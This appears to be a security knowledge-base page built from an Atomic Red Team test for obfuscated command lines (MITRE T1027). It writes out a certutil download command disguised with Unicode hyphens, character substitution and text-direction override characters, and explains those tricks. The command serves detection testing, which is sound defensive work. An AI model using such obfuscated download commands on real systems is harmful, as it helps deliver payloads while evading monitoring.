---
atomic_guid: "e68b945c-52d0-4dd9-a5e8-d173d70c448f"
title: "Obfuscated Command Line using special Unicode characters"
framework: "atomic"
generated: "true"
attack_technique_id: "T1027"
attack_technique_name: "Obfuscated Files or Information"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.yaml"
build_date: "2026-04-26 17:02:12"
executor: "manual"
aliases:
  - "e68b945c-52d0-4dd9-a5e8-d173d70c448f"
  - "Obfuscated Command Line using special Unicode characters"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Obfuscated Command Line using special Unicode characters

This is an obfuscated certutil command that when executed downloads a file from the web. Adapted from T1105. Obfuscation includes special options chars (unicode hyphens), character substitution (e.g. ᶠ) and character insertion (including the usage of the right-to-left 0x202E and left-to-right 0x202D override characters).
Reference:
https://wietze.github.io/blog/windows-command-line-obfuscation

## Metadata

- Atomic GUID: e68b945c-52d0-4dd9-a5e8-d173d70c448f
- Technique: T1027: Obfuscated Files or Information
- Platforms: windows
- Executor: manual
- Source Path: atomics/T1027/T1027.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1027-obfuscated_files_or_information|T1027]]

## Input Arguments

### local_path

- description: Local path/filename to save the downloaded file to
- type: path
- default: Atomic-license.txt

### remote_file

- description: URL of file to download
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

## Executor

- name: manual
- steps: 1. Copy the following command into the command prompt after replacing #{remote_file} and #{local_path} with your desired URL and filename.


  certutil —ૹu૰rlࢰca࣢c෯he  –‮spli؅t‮‭ −"൏ᶠ൸" #{remote_file} #{local_path}


2. Press enter to execute the command. You will find the file or webpage you specified saved to the file you specified in the command.


## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.yaml)
